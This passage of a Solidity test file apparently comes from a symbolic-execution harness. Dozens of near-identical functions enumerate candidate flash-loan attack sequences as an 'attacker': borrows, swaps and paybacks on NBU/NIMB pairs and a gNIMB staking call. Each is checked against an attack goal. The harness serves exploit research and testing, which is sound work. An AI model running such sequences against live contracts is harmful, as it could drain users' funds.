        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3836(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3837(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3838(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3839(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3840(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3841(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3842(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3843(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3844(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3845(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3846(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3847(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3848(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3849(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3850(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3851(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3852(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3853(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3854(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3855(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3856(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3857(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3858(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3859(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3860(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3861(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3862(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3863(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3864(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3865(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3866(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3867(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3868(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3869(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3870(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3871(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3872(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3873(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3874(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3875(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3876(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3877(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3878(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3879(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3880(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3881(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
